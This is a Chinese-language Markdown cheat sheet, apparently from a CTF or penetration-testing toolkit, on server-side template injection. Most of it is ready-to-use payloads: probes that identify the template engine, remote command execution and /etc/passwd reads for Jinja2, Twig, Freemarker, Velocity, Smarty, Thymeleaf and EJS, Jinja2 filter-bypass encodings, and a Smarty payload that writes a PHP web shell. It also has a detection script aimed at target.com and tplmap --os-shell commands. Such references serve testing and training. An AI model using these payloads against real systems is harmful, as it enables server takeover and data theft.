# 🎨 SSTI 服务端模板注入模块

## 适用场景
- 模板引擎渲染用户输入
- 邮件模板、报告生成
- 用户可控的显示内容

## 检查清单

```yaml
模板引擎识别:
  - [ ] Jinja2 (Python)
  - [ ] Twig (PHP)
  - [ ] Freemarker (Java)
  - [ ] Velocity (Java)
  - [ ] Smarty (PHP)
  - [ ] Thymeleaf (Java)
  - [ ] EJS (Node.js)
  - [ ] Pug/Jade (Node.js)
  - [ ] Mako (Python)

检测方法:
  - [ ] 数学运算 {{7*7}}
  - [ ] 字符串操作
  - [ ] 配置读取
  - [ ] 类/对象访问

利用方式:
  - [ ] 信息泄露
  - [ ] 任意文件读取
  - [ ] 远程代码执行
  - [ ] 反弹 Shell
```

## 分析流程

### Step 1: SSTI 检测

```bash
# 通用检测 Payload
{{7*7}}              # 大多数引擎
${7*7}               # Freemarker, Velocity
<%= 7*7 %>           # ERB (Ruby)
#{7*7}               # Thymeleaf, Ruby
${{7*7}}             # 嵌套

# 如果返回 49，说明存在 SSTI

# 进一步识别引擎
{{7*'7'}}            # Jinja2 返回 7777777, Twig 返回 49
{{config}}           # Jinja2 有效
{php}...{/php}       # Smarty
#set($x=7*7)$x       # Velocity
```

### Step 2: 模板引擎识别

```yaml
决策树:
  ${7*7}:
    返回 49:
      ${class.getClass().forName...}: Freemarker
      检查 Velocity
    返回 ${7*7}: 不是 Freemarker/Velocity
    
  {{7*7}}:
    返回 49:
      {{7*'7'}}:
        返回 49: Twig
        返回 7777777: Jinja2
    返回 {{7*7}}: 不是 Jinja2/Twig
    
  <%= 7*7 %>:
    返回 49: EJS 或 ERB
    
  #{7*7}:
    返回 49: Thymeleaf
```

### Step 3: Jinja2 利用 (Python)

```python
# 基础检测
{{7*7}}
{{config}}
{{config.items()}}
{{self.__dict__}}

# 获取类和方法
{{''.__class__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1]}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE - 方法1: 找 os 模块
{{''.__class__.__mro__[1].__subclasses__()[xxx].__init__.__globals__['os'].popen('id').read()}}

# RCE - 方法2: 通过 config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# RCE - 方法3: 找 subprocess
{{''.__class__.__mro__[1].__subclasses__()}}.index(subprocess.Popen)
{{''.__class__.__mro__[1].__subclasses__()[xxx]('id',shell=True,stdout=-1).communicate()}}

# 遍历找可用类的脚本
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if 'os' in c.__init__.__globals__.keys() %}
{{c.__init__.__globals__['os'].popen('id').read()}}
{% endif %}
{% endfor %}

# 读取文件
{{''.__class__.__mro__[1].__subclasses__()[xxx].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

### Step 4: Jinja2 过滤绕过

```python
# 绕过 . (点)
{{''['__class__']}}
{{''|attr('__class__')}}

# 绕过 _ (下划线)
{{''['\x5f\x5fclass\x5f\x5f']}}
{{''[request.args.a]}}?a=__class__

# 绕过 []
{{''.__class__}}
{{''|attr('__class__')}}

# 绕过关键字
{%set a='o'+'s'%}{{config.__class__.__init__.__globals__[a].popen('id').read()}}

# 绕过 {{}}
{%print(7*7)%}
{%if 1==1%}true{%endif%}

# request 对象利用
{{request.args.get('a')}}?a=xxx
{{request.cookies.get('a')}}
{{request.headers.get('a')}}

# 复杂绕过 (使用编码)
{% set chr=lipsum.__globals__.__builtins__.chr %}
{{lipsum.__globals__.os.popen(chr(105)+chr(100)).read()}}
```

### Step 5: Twig 利用 (PHP)

```php
# 基础检测
{{7*7}}
{{_self}}
{{_self.env}}

# 获取配置
{{_self.env.getRuntimeLoaderSource()}}

# RCE - 方法1
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE - 方法2
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# RCE - 方法3 (Twig 1.x)
{{'/etc/passwd'|file_excerpt(1,10)}}

# RCE - 方法4 (Twig 2.x+)
{{["id"]|filter("system")}}
{{["id"|filter("system")]|join}}
{{['id']|map('system')}}

# 读取文件
{{source('/etc/passwd')}}
```

### Step 6: Freemarker 利用 (Java)

```java
// 基础检测
${7*7}
${.dataModel}

// RCE - 方法1: Execute
${"freemarker.template.utility.Execute"?new()("id")}

// RCE - 方法2: ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")?toString()}

// 读取文件
<#assign is=object?new("java.io.FileInputStream","/etc/passwd")>
<#assign br=object?new("java.io.BufferedReader",object?new("java.io.InputStreamReader",is))>
<#list 1..100 as i>
    ${br.readLine()!""}
</#list>
<#assign void=br.close()>
```

### Step 7: Velocity 利用 (Java)

```java
// 基础检测
#set($x=7*7)$x
$class.inspect("java.lang.Runtime")

// RCE
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($chr=$x.class.forName("java.lang.Character"))
#set($str=$x.class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Step 8: Smarty 利用 (PHP)

```php
// 基础检测
{7*7}
{php}echo 1;{/php}  // Smarty 2.x

// RCE - Smarty 2.x
{php}system('id');{/php}

// RCE - Smarty 3.x
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

// 其他 Payload
{system('id')}
{exec('id')}
{self::getStreamVariable("file:///etc/passwd")}
```

### Step 9: Thymeleaf 利用 (Java)

```java
// 基础检测
[[${7*7}]]
[[${'hello'}]]

// RCE - Spring SpEL
${T(java.lang.Runtime).getRuntime().exec('id')}

// 文件读取 (需要 SpEL)
${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd'))}

// URL 注入方式
http://target.com/__${7*7}__::.x

// 变体
__$%7B7*7%7D__::.x
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Step 10: EJS 利用 (Node.js)

```javascript
// 基础检测
<%= 7*7 %>

// RCE
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

// 简化版本
<%= require('child_process').execSync('id').toString() %>

// 读取文件
<%= global.process.mainModule.require('fs').readFileSync('/etc/passwd').toString() %>
```

## 常见套路与解法

### 套路 1: 基础 RCE

**特征**: 无过滤

**Jinja2**:
```python
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

### 套路 2: 过滤点号

**解法**:
```python
{{''['__class__']['__mro__'][1]['__subclasses__']()}}
{{''|attr('__class__')|attr('__mro__')|first|attr('__subclasses__')()}}
```

### 套路 3: 过滤下划线

**解法**:
```python
# 使用 request 对象
{{()|attr(request.args.a)}}?a=__class__

# 使用 hex
{{''['\x5f\x5fclass\x5f\x5f']}}

# 使用 Unicode
{{''['\u005f\u005fclass\u005f\u005f']}}
```

### 套路 4: 过滤关键字

**解法**:
```python
# 字符串拼接
{%set a='o'+'s'%}{{config.__class__.__init__.__globals__[a]}}

# chr 函数
{%set chr=lipsum.__globals__.__builtins__.chr%}
{{lipsum.__globals__[chr(111)+chr(115)]}}
```

## 自动化脚本

```python
#!/usr/bin/env python3
"""
SSTI 检测脚本
"""

import requests

url = "http://target.com/render"
param = "name"

# 检测 Payload
detect_payloads = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{{7*'7'}}", ["49", "7777777"]),
]

def detect_ssti():
    for payload, expected in detect_payloads:
        try:
            resp = requests.get(url, params={param: payload})
            
            if isinstance(expected, list):
                for e in expected:
                    if e in resp.text:
                        print(f"[+] SSTI Detected: {payload} -> {e}")
            elif expected in resp.text:
                print(f"[+] SSTI Detected: {payload}")
                
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    detect_ssti()
```

## 工具速查

```bash
# tplmap - SSTI 自动化检测和利用
python tplmap.py -u "http://target.com/?name=*"

# 参数估算
python tplmap.py -u "http://target.com/?name=*" --os-shell

# 常用 Payload 生成
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
```
